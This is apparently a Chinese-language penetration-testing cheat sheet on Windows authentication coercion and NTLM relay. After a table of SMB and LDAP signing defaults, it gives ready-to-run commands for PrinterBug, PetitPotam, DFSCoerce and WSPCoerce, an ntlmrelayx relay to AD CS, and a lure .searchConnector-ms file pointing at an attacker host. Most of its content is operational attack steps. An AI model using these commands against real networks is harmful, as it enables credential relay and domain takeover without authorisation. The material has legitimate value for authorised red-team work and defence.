# 内网 - 强制认证

强制认证是指迫使目标机器（通常具有 SYSTEM 权限）向另一台机器进行身份验证。

## 签名

### 服务器端签名

| 操作系统 | SMB 签名 | LDAP 签名 |
| ------------------------------- | --- | --- |
| Windows Server 2019 DC          | ✅  |  ❌ |
| Windows Server 2022 DC pre 23H2 | ✅  |  ❌ |
| Windows Server 2022 DC 23H2     | ✅  |  ✅ |
| Windows Server 2025 DC          | ✅  |  ✅ |
| Windows Server 2019 成员服务器   | ❌  |  -  |
| Windows Server 2022 成员服务器   | ❌  |  -  |
| Windows Server 2025 成员服务器   | ❌  |  -  |
| Windows 10                      | ❌  |  -  |
| Windows 11 23H2                 | ❌  |  -  |
| Windows 11 24H2                 | ✅  |  -  |

* 域控制器上已默认启用服务器端 SMB 签名
* 非 DC 的 Windows 服务器上默认仍不要求服务器端 SMB 签名

### EPA

* [zyn3rgy/RelayInformer](https://github.com/zyn3rgy/RelayInformer) - 从攻击者角度确定主流 NTLM 中继目标 EPA 强制级别的 Python 和 BOF 工具。

```ps1
uv run relayinformer mssql --target 10.10.10.10 --user USER --password PASSWORD
uv run relayinformer http --url http://10.10.10.10/page --user USER --password PASSWORD
uv run relayinformer ldap --method BOTH --dc-ip 10.10.10.10 --user USER --password PASSWORD
uv run relayinformer ldap --method LDAPS --dc-ip 10.10.10.10 --user USER --password PASSWORD
```

| EPA 值 | 描述 |
| ---------- | ----------- |
| Disabled / Never | 通常可以使用 NTLM 中继进行攻击，无论客户端对 EPA 的支持或 NTLM 版本如何。 |
| Allowed / Accepted / When Supported | 理论上可以进行 NTLM 中继，但常见的中继场景不起作用，因为标准强制认证/投毒技术会导致添加 EPA 相关的 AV 对，表明客户端支持 EPA。 |
| Required | 通过验证 EPA 相关 AV 对中提供的值来阻止 NTLM 中继。 |

## WebClient 服务

* 在 Windows 工作站上，WebClient 服务默认已安装。
* 在 Windows 服务器上，默认未安装

**启用 WebClient**：

可以使用多种技术在机器上启用 WebClient 服务：

* 使用 `net` 命令映射 WebDav 服务器：`net use ...`
* 在资源管理器地址栏中输入任何不是本地文件或目录的内容
* 浏览到内部包含 `.searchConnector-ms` 扩展名文件的目录或共享。

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
        <description>Microsoft Outlook</description>
        <isSearchOnlyItem>false</isSearchOnlyItem>
        <includeInStartMenuScope>true</includeInStartMenuScope>
        <templateInfo>
            <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
        </templateInfo>
        <simpleLocation>
            <url>http://attacksystem/path</url>
        </simpleLocation>
    </searchConnectorDescription>
    ```

检查 WebDav 服务是否正在运行

```ps1
nxc smb <ip> -u 'user' -p 'pass' -M webdav
```

## MS-RPRN - PrinterBug

**工具**：

* [leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample) - 通过 MS-RPRN RPC 接口强制 Windows 主机向其他机器认证的 PoC 工具。

**示例**：

```ps1
poetry run nxc smb 10.10.10.10/24 -u username -p password -M coerce_plus -o METHOD=PrinterBug
```

检查后台打印程序服务是否正在运行。

```ps1
nxc smb <ip> -u 'user' -p 'pass' -M spooler
```

## MS-EFSR - PetitPotam

这些工具使用 LSARPC 命名管道及接口 `c681d488-d850-11d0-8c52-00c04fd90f7e`，因为它更为普遍。但也可以通过 EFSRPC 命名管道和接口 `df1941c5-fe89-4e79-bf10-463657acf44d` 来触发。

**工具**：

* [topotam/PetitPotam](https://github.com/topotam/PetitPotam) - 通过 MS-EFSRPC EfsRpcOpenFileRaw 或其他函数强制 Windows 主机向其他机器认证的 PoC 工具。

**示例**：

```ps1
poetry run nxc smb 10.10.10.10/24 -u username -p password -M coerce_plus -o METHOD=PetitPotam
```

## MS-DFSNM - DFS 强制认证

DFS 强制认证（MS-DFSNM 滥用）是通过滥用 DFS 命名空间管理 RPC 接口来强制 Windows 系统向攻击者控制的机器认证的技术。

**工具**：

* [Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) - 使用 NetrDfsRemoveStdRoot 和 NetrDfsAddStdRoot 方法的 MS-DFSNM 强制认证 PoC。

**示例**：

```ps1
python3 dfscoerce.py -u username -d domain.local 10.10.10.10 10.10.10.11
poetry run nxc smb 10.10.10.10/24 -u username -p password -M coerce_plus -o METHOD=DFSCoerce
```

## MS-WSP - WSP 强制认证

* `wsearch` 服务仅在工作站上默认启用，自 Server 2016 起在服务器上已禁用。
* 只有 SMB 连接可以通过 WSP 进行强制。

**工具**：

* [slemire/WSPCoerce](https://github.com/slemire/WSPCoerce) - 使用 MS-WSP 从 Windows 主机强制认证的 PoC。
* [RedTeamPentesting/wspcoerce](https://github.com/RedTeamPentesting/wspcoerce) - wspcoerce 通过 MS-WSP 将 Windows 计算机帐户的 SMB 强制认证到任意目标。

**示例**：

```ps1
WSPCoerce.exe <target> <listener>
WSPCoerce.exe labsw1 172.23.10.109
WSPCoerce.exe labsw1 labsrv1

wspcoerce 'lab.redteam/rtpttest:test1234!@192.0.2.115' "file:////attacksystem/share"
ntlmrelayx.py -t "http://192.0.2.5/certsrv/" -debug -6 -smb2support --adcs
```

* 不能使用 IP 地址作为目标，只能使用短主机名（不是 FQDN）
* 如果你想接收 Kerberos 认证，确保为监听器使用主机名或 FQDN

## 参考资料

* [Changes to SMB Signing Enforcement Defaults in Windows 24H2 - Michael Grafnetter - January 26, 2025](https://www.dsinternals.com/en/smb-signing-windows-server-2025-client-11-24h2-defaults/)
* [Less Praying More Relaying – Enumerating EPA Enforcement for MSSQL and HTTPS - Nick Powers, Matt Creel - November 25, 2025](https://specterops.io/blog/2025/11/25/less-praying-more-relaying-enumerating-epa-enforcement-for-mssql-and-https/)
* [The Ultimate Guide to Windows Coercion Techniques in 2025 - RedTeam Pentesting - June 4, 2025](https://blog.redteam-pentesting.de/2025/windows-coercion/)
